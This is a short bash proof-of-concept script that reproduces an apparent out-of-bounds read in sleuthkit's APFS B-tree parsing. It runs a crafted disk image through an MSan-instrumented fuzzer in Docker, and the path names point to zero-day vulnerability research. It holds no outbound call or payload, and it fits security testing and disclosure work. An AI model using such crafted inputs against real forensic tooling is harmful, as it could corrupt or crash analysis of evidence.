#!/usr/bin/env bash
# PoC for: 01-apfs-btree-keycount-oob
# Confirmed on: sleuthkit commit 01de034 (2026-04-15)

POC_IMG="/scr2/yiwei/vul-agent/zero-day/sleuthkit_validated/01-apfs-btree-keycount-oob/apfs_btree_huge_key_count.img"
DOCKER_IMG="vulagent/sleuthkit:20260417"

echo "[*] Running PoC: 01-apfs-btree-keycount-oob"
echo "[*] Image: $POC_IMG"
echo ""
docker run --rm --memory=2g \
  -v "$(dirname "$POC_IMG"):/h" \
  "$DOCKER_IMG" \
  bash -c "MSAN_OPTIONS='halt_on_error=1:print_stacktrace=1' /out/msan/fls_apfs_fuzzer /h/$(basename "$POC_IMG")" 2>&1 || true
